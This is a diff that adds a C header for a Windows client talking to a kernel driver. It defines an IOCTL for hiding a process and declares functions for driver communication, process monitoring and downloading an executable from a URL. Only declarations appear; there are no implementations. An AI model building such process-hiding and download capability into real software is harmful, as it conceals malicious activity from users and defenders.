@@ -1,0 +1,40 @@
+#include "ntdll.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <wininet.h>
+#include <tlhelp32.h>
+#include <sddl.h>
+#include <windows.h>
+
+#pragma comment(lib, "ntdll")
+#pragma comment(lib, "wininet.lib")
+
+#define DEVICE_NAME L"\\\\.\\MyDevice"
+
+#define IOCTL_CREATE_DIRECTORY \
+		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define IOCTL_HIDE_PROCESS \
+		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+BOOLEAN ConnectDriver(
+	_In_		DWORD  DwIoControlCode,
+	_In_opt_	LPVOID InBuffer,
+	_In_opt_	DWORD  InBufferSize,
+	_In_opt_	LPVOID OutBuffer,
+	_In_opt_	DWORD  OutBufferSize
+);
+
+BOOLEAN IsProcessRunning(
+	_In_ DWORD ProcessID
+);
+
+BOOLEAN MonitorProcess(
+	_In_ DWORD ProcessID
+);
+
+BOOLEAN DownloadExecutable(
+	_In_ CONST CHAR* URL,
+	_In_ CONST CHAR* FilePath
+);
